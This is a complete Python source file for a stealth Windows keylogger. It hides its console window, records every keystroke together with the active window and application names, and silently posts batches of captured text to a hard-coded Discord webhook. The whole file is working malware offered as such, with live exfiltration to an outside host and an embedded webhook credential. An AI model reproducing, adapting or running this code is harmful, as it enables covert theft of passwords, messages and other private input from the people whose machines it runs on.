import threading
import time
import requests
from pynput import keyboard
import ctypes
from ctypes import wintypes
import re
import sys
import os

# Hide console window if running as .exe
if sys.platform == "win32":
    try:
        # Hide the console window
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# Windows API for getting window titles
user32 = ctypes.windll.user32

class Keylogger:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.key_buffer = []
        self.key_count = 0
        self.lock = threading.Lock()
        self.running = True
        self.SEND_THRESHOLD = 100
        self.current_window = None
        
    def clean_window_title(self, title):
        """Clean up window title to make it more readable"""
        if not title or title == "No Window Title":
            return "Unknown Window"
        
        cleaned = title
        
        # Remove common clutter
        cleaned = re.sub(r'\s*-\s*Profile\s+\d+', '', cleaned)
        cleaned = re.sub(r'\s*-\s*Personal', '', cleaned)
        cleaned = re.sub(r'\s*-\s*Work', '', cleaned)
        cleaned = re.sub(r'\s*and\s+\d+\s+more\s+pages?\s*', '', cleaned, flags=re.IGNORECASE)
        cleaned = re.sub(r'\s*-\s+\d+\s+other\s+pages?\s*', '', cleaned, flags=re.IGNORECASE)
        cleaned = re.sub(r'\s*-\s*Microsoft\s*Edge', '', cleaned, flags=re.IGNORECASE)
        cleaned = re.sub(r'\s*-\s*Google\s*Chrome', '', cleaned, flags=re.IGNORECASE)
        cleaned = re.sub(r'\s*-\s*Firefox', '', cleaned, flags=re.IGNORECASE)
        cleaned = re.sub(r'\s*-\s*Brave', '', cleaned, flags=re.IGNORECASE)
        cleaned = re.sub(r'\s*-\s*Opera', '', cleaned, flags=re.IGNORECASE)
        cleaned = re.sub(r'\s*-\s*$', '', cleaned)
        cleaned = ' '.join(cleaned.split())
        
        if len(cleaned) > 50:
            cleaned = cleaned[:47] + "..."
        
        return cleaned if cleaned else "Unknown Window"
    
    def get_app_name(self, window_title):
        """Extract just the app name from window title"""
        apps = {
            'msedge.exe': 'Edge',
            'chrome.exe': 'Chrome',
            'firefox.exe': 'Firefox',
            'brave.exe': 'Brave',
            'opera.exe': 'Opera',
            'winword.exe': 'Word',
            'excel.exe': 'Excel',
            'powerpnt.exe': 'PowerPoint',
            'outlook.exe': 'Outlook',
            'notepad.exe': 'Notepad',
            'code.exe': 'VS Code',
            'explorer.exe': 'File Explorer',
            'cmd.exe': 'Command Prompt',
            'powershell.exe': 'PowerShell',
            'devenv.exe': 'Visual Studio',
            'slack.exe': 'Slack',
            'discord.exe': 'Discord',
            'spotify.exe': 'Spotify',
            'photoshop.exe': 'Photoshop',
            'premiere.exe': 'Premiere',
            'vlc.exe': 'VLC Player',
            'steam.exe': 'Steam',
        }
        
        for exe, name in apps.items():
            if exe.lower() in window_title.lower():
                return name
        
        if 'edge' in window_title.lower() or 'chrome' in window_title.lower():
            match = re.search(r'(?:https?://)?(?:www\.)?([^/\s]+)', window_title)
            if match:
                domain = match.group(1)
                domain = re.sub(r'\.(com|org|net|edu|gov|io|co|uk)$', '', domain)
                if domain and len(domain) < 30:
                    return domain.capitalize()
        
        return "App"
    
    def get_active_window(self):
        """Get cleaned window title"""
        try:
            hwnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(hwnd)
            buff = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, buff, length + 1)
            raw_title = buff.value if buff.value else "No Window Title"
            
            cleaned_title = self.clean_window_title(raw_title)
            
            try:
                from ctypes import byref
                pid = ctypes.c_ulong()
                user32.GetWindowThreadProcessId(hwnd, byref(pid))
                try:
                    import psutil
                    process = psutil.Process(pid.value)
                    process_name = process.name()
                    app_name = self.get_app_name(process_name)
                    return f"{cleaned_title} [{app_name}]"
                except:
                    return cleaned_title
            except:
                return cleaned_title
                
        except Exception as e:
            return f"Window"
    
    def on_press(self, key):
        """Called when a key is pressed"""
        try:
            current_window = self.get_active_window()
            
            with self.lock:
                if self.current_window != current_window:
                    self.current_window = current_window
                    marker = f"\n[WINDOW: {current_window}]\n"
                    self.key_buffer.append(marker)
            
            if hasattr(key, 'char') and key.char is not None:
                keystroke = key.char
                
                with self.lock:
                    self.key_buffer.append(keystroke)
                    self.key_count += 1
                    
                    if self.key_count >= self.SEND_THRESHOLD:
                        self.send_keys()
                        
            else:
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.delete: '[DELETE]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.shift_r: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.ctrl_r: '[CTRL]',
                    keyboard.Key.alt: '[ALT]',
                    keyboard.Key.alt_r: '[ALT]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.up: '[UP]',
                    keyboard.Key.down: '[DOWN]',
                    keyboard.Key.left: '[LEFT]',
                    keyboard.Key.right: '[RIGHT]',
                    keyboard.Key.f1: '[F1]',
                    keyboard.Key.f2: '[F2]',
                    keyboard.Key.f3: '[F3]',
                    keyboard.Key.f4: '[F4]',
                    keyboard.Key.f5: '[F5]',
                    keyboard.Key.f6: '[F6]',
                    keyboard.Key.f7: '[F7]',
                    keyboard.Key.f8: '[F8]',
                    keyboard.Key.f9: '[F9]',
                    keyboard.Key.f10: '[F10]',
                    keyboard.Key.f11: '[F11]',
                    keyboard.Key.f12: '[F12]',
                    keyboard.Key.cmd: '[WINDOWS]',
                    keyboard.Key.cmd_r: '[WINDOWS]',
                }
                keystroke = special_keys.get(key, f'[{key}]')
                
                with self.lock:
                    self.key_buffer.append(keystroke)
                    
        except Exception as e:
            # Silent fail - no console output in stealth mode
            pass
    
    def send_keys(self):
        """Send accumulated keystrokes to Discord"""
        if not self.key_buffer:
            return
            
        message = ''.join(self.key_buffer)
        self.key_buffer = []
        self.key_count = 0
        
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        data = {
            "content": f"**📝 Keystroke Log - {timestamp}**\n```\n{message}\n```",
            "username": "Keylogger Bot"
        }
        
        try:
            response = requests.post(self.webhook_url, json=data, timeout=5)
            # No console output in stealth mode
        except Exception as e:
            # Silent fail
            pass
    
    def stop(self):
        """Stop the keylogger"""
        self.running = False
        with self.lock:
            if self.key_buffer:
                self.send_keys()
        return False
    
    def run(self):
        """Start the keylogger in stealth mode"""
        # No console output - running silently
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
        
        with self.lock:
            if self.key_buffer:
                self.send_keys()

def main():
    WEBHOOK_URL = "https://discord.com/api/webhooks/1535998930540822610/3CeJ0uKLBZwPs8HmYg5wq6bQDm7a5SIg89Epw-VYFlAmkPt8dbMPzf4P1meOGoYKFEkz"
    
    if "YOUR_WEBHOOK_ID" in WEBHOOK_URL:
        # Silent fail - no console output
        return
    
    keylogger = Keylogger(WEBHOOK_URL)
    
    try:
        keylogger.run()
    except:
        # Silent fail
        pass

if __name__ == "__main__":
    main()
